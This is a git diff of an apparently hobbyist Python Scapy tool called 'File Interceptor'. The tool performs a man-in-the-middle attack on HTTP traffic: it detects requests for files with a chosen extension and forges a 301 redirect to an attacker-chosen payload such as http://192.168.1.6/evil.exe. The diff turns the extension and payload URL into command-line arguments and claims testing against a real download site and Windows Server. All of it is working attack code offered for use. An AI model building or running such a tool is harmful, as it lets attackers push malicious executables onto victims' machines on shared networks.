@@ -17,8 +17,8 @@ def do_packet_process(packet):
         
         if obj_packet_scapy[scapy.TCP].dport == 80:
             print("ℹ️  HTTP Request")
-            if ".exe" in obj_packet_scapy[scapy.Raw].load.decode():
-                print("🔔 Executable File (.exe) Request")
+            if obj_options.ext in obj_packet_scapy[scapy.Raw].load.decode():
+                print("🔔 CUSTOM PAYLOAD EXTENSION (" + obj_options.ext + ") REQUEST FOUND")
                 ## Adds the ack field in the list
                 list_ack.append(obj_packet_scapy[scapy.TCP].ack)
                 print(obj_packet_scapy.show())
@@ -37,7 +37,8 @@ def do_packet_process(packet):
                 ## Reference https://en.wikipedia.org/wiki/HTTP_301
                 ## \n\n suffix was added to ensure extra characters will not interfere with the process
                 # obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: https://www.7-zip.org/a/7z2301-x64.exe\n\n")
-                obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: http://192.168.1.6/evil.exe\n\n")
+                # obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: " + "http://192.168.1.6/evil.exe" + "\n\n")
+                obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: " + obj_options.payload + "\n\n")
                 packet.set_payload(bytes(obj_packet_mod))
                 
                 
@@ -57,11 +58,11 @@ def do_payload_set(obj_packet, str_payload):
 def get_arguments():
     obj_parser = argparse.ArgumentParser(
         prog='File Interceptor',
-        description='Intercepts Payload via MITM + DNS Poisoning.',
-        epilog='Not yet tested'
+        description='Intercepts Payload via MITM.',
+        epilog='Tested in http://www.speedbit.com/ and Windows Server'
     )
-    obj_parser.add_argument("-d", "--domain-name", dest="dns", help="DNS (E.g. www.bing.com)", required=False)
-    obj_parser.add_argument("-p", "--payload", dest="payload", help="IPv4 Rerouting Address (E.g. 192.168.1.6)", required=False)
+    obj_parser.add_argument("-e", "--extension", dest="ext", help="Extension of the expected payload (E.g. .exe, .rar, .zip)", required=True)
+    obj_parser.add_argument("-p", "--payload", dest="payload", help="Payload file Absolute Path (E.g. http://192.168.1.6/evil.exe https://www.7-zip.org/a/7z2301-x64.exe)", required=True)
     options = obj_parser.parse_args()
     return options
 
